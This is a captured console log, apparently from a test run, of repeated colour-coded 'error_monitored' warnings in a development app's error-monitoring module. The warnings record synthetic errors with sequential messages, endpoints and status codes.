WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797178Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2058'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797239Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2059'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2060'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797343Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2061'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2062'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797443Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2063'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797492Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2064'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797541Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2065'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797589Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2066'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2067'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2068'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797733Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2069'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2070'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797829Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2071'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2072'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797928Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2073'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2074'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798025Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2075'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798074Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2076'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798124Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2077'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798179Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2078'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798287Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2079'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2080'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798420Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2081'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2082'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2083'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2084'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2085'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798672Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2086'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798722Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2087'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2088'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798821Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2089'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798870Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2090'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.798971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2091'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799041Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2092'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799096Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2093'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2094'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799199Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2095'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2096'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.799367Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2097'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
